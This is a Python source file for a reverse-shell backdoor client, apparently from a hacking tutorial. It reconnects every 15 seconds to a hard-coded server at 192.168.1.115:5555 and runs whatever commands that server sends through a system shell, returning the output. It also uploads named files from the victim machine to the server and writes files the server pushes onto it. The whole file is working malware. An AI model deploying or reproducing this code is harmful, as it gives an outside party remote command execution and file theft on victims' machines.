import socket
import time
import json
import subprocess# It will allow us to execute any commands that server sends.
import os# For changing cd's.

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # The same thing.

def reliable_send(data):
	jsondata = json.dumps(data)
	s.send(jsondata.encode())

def reliable_recv():
	data = ''
	while True:
		try:
			data = data + s.recv(1024).decode().rstrip()#amount of bytes we wanna receive, decoding back, striping from any additional characters
			return json.loads(data)
		except ValueError:
			continue

def connection(): # Making the connection function.
	while True: # Running function infinitely until it manages to connect.
		time.sleep(15) # Connecting each 15 seconds.
		print('connection')
		try:
			s.connect(("192.168.1.115", 5555)) # Connecting to our server.
			shell() # If the function manages to connect to our server, call the function "shell()".
			s.close()# Closing the connection after the shell function is over.
			break # Breaking the loop.
		except: # If couldn't connect, call this connection func again.
			connection()

def upload_file(file_name):
	f = open(file_name, 'rb')# Reading the contents of the file
	s.send(f.read())

def download_file(file_name):
	f = open(file_name, 'wb')# open/create the file in which the content of the file that we want to download will be stored
	s.settimeout(1)
	chunk = s.recv(1024)# variable which stores parts of content of the file
	while chunk:# receiving bytes until there are some
		print("chunk", chunk)
		f.write(chunk)
		try:
			chunk = s.recv(1024)
		except socket.timeout as e:
			break
	s.settimeout(None)
	f.close()

def shell():
	while True:
		command = reliable_recv()# Receiving the command from server.
		if command == 'quit':
			break
		elif command[:3] == 'cd ':
			os.chdir(command[3:])
		elif command == 'clear':
			pass
		elif command[:8] == 'download':
			upload_file(command[9:])
		elif command[:6] == 'upload':
			download_file(command[7:])
		else:
			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = execute.stdout.read() + execute.stderr.read()
			result = result.decode('cp866')
			reliable_send(result)




connection() # Calling connection function